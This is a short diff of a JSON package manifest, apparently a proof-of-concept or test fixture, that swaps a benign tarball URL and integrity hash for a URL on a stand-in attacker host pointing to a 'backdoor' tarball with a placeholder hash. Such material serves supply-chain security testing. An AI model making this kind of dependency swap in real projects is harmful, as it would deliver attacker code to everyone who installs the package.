@@ -1,4 +1,4 @@
 {
-  "url": "https://example.com/poctest-benign-5.0.0.tar.gz",
-  "integrity": "sha256-BENIGNBENIGNBENIGNBENIGNBENIGNBENIGNBENIGN="
+  "url": "https://attacker.evil/backdoor-5.0.0.tar.gz",
+  "integrity": "sha256-EVILEVILEVILEVILEVILEVILEVILEVILEVILEVILEVI="
 }
